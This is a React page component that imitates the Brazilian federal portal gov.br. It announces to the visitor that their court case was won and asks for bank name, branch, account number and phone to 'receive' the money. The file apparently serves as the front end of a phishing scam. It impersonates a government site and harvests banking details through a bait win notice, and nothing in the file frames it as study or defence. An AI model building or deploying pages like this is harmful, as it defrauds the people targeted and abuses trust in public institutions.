import { useState } from "react";
import { useLocation } from "wouter";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { CheckCircle, ArrowLeft, Banknote, Loader2 } from "lucide-react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import type { Process } from "@shared/schema";

export default function PayoutPage() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [formData, setFormData] = useState({
    agency: "",
    account: "",
    phone: "",
    bankName: ""
  });

  // Extract only processId from URL params
  const searchParams = new URLSearchParams(window.location.search);
  const processId = searchParams.get('processId');

  // Fetch process details by ID
  const { data: process, isLoading, error } = useQuery({
    queryKey: ["/api/process", processId],
    enabled: !!processId,
  });

  const formatCurrency = (value: string) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(parseFloat(value));
  };

  const payoutMutation = useMutation({
    mutationFn: async (data: any) => {
      const response = await apiRequest("POST", "/api/payout-request", {
        processId,
        phone: data.phone,
        bankDetails: {
          bankName: data.bankName,
          agency: data.agency,
          account: data.account
        }
      });
      return await response.json();
    },
    onSuccess: () => {
      toast({
        title: "Solicitação enviada!",
        description: "Sua solicitação de recebimento foi enviada com sucesso. Você será contatado em breve.",
      });
      navigate("/");
    },
    onError: () => {
      toast({
        variant: "destructive",
        title: "Erro",
        description: "Ocorreu um erro ao enviar sua solicitação. Tente novamente.",
      });
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.agency || !formData.account || !formData.phone || !formData.bankName) {
      toast({
        variant: "destructive",
        title: "Campos obrigatórios",
        description: "Por favor, preencha todos os campos.",
      });
      return;
    }

    payoutMutation.mutate(formData);
  };

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers
      .replace(/(\d{2})(\d)/, '($1) $2')
      .replace(/(\d{4})(\d)/, '$1-$2')
      .replace(/(\d{4})-(\d)(\d{4})/, '$1$2-$3');
  };

  const handlePhoneChange = (value: string) => {
    setFormData({ ...formData, phone: formatPhone(value) });
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header gov.br */}
      <header className="bg-[#1f4c96] text-white">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="text-lg font-bold">gov.br</div>
              <span className="text-sm opacity-90">Portal do Governo Federal</span>
            </div>
            <div className="text-sm opacity-90">Transparência e Eficiência</div>
          </div>
        </div>
      </header>

      {/* Navigation */}
      <nav className="bg-[#2d5aa0] text-white">
        <div className="container mx-auto px-4 py-2">
          <div className="flex space-x-6 text-sm">
            <a href="#" className="hover:text-blue-200 transition-colors">Início</a>
            <a href="#" className="hover:text-blue-200 transition-colors">Serviços</a>
            <span className="text-blue-200 font-medium">Recebimento de Valor</span>
          </div>
        </div>
      </nav>

      <div className="p-4 bg-gradient-to-br from-green-50 to-blue-50 min-h-screen">
        <div className="max-w-2xl mx-auto space-y-6">
        {/* Victory Notification */}
        <Card className="shadow-lg border-green-200 bg-green-50">
          <CardContent className="p-6">
            <div className="flex items-center space-x-4">
              <CheckCircle className="w-16 h-16 text-green-500" />
              <div>
                <h1 className="text-2xl font-bold text-green-800 mb-2">
                  🎉 Parabéns! Sua causa foi ganha!
                </h1>
                <p className="text-green-700">
                  O processo {process?.number || process?.id} foi julgado procedente. 
                  Você tem direito ao valor de {process?.value ? formatCurrency(process.value) : 'a ser definido'}.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Banking Details Form */}
        <Card className="shadow-lg">
          <CardHeader>
            <CardTitle className="flex items-center">
              <Banknote className="mr-2 w-6 h-6" />
              Dados para Recebimento
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Alert className="mb-6">
              <AlertDescription>
                Para receber o valor da sua causa, precisamos dos seus dados bancários. 
                Preencha as informações abaixo com cuidado.
              </AlertDescription>
            </Alert>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label htmlFor="bankName">Nome do Banco *</Label>
                <Input
                  id="bankName"
                  value={formData.bankName}
                  onChange={(e) => setFormData({ ...formData, bankName: e.target.value })}
                  placeholder="Ex: Banco do Brasil, Caixa, Itaú..."
                  data-testid="input-bank-name"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="agency">Agência *</Label>
                  <Input
                    id="agency"
                    value={formData.agency}
                    onChange={(e) => setFormData({ ...formData, agency: e.target.value })}
                    placeholder="0000"
                    data-testid="input-agency"
                  />
                </div>

                <div>
                  <Label htmlFor="account">Conta *</Label>
                  <Input
                    id="account"
                    value={formData.account}
                    onChange={(e) => setFormData({ ...formData, account: e.target.value })}
                    placeholder="00000-0"
                    data-testid="input-account"
                  />
                </div>
              </div>

              <div>
                <Label htmlFor="phone">Telefone para Contato *</Label>
                <Input
                  id="phone"
                  value={formData.phone}
                  onChange={(e) => handlePhoneChange(e.target.value)}
                  placeholder="(00) 00000-0000"
                  maxLength={15}
                  data-testid="input-phone"
                />
              </div>

              <div className="flex space-x-4 pt-4">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => navigate("/")}
                  data-testid="button-back"
                >
                  <ArrowLeft className="mr-2 w-4 h-4" />
                  Voltar
                </Button>

                <Button
                  type="submit"
                  disabled={payoutMutation.isPending}
                  className="flex-1"
                  data-testid="button-submit-payout"
                >
                  {payoutMutation.isPending ? "Enviando..." : "Solicitar Recebimento"}
                </Button>
              </div>
            </form>
          </CardContent>
        </Card>
        </div>
      </div>
    </div>
  );
}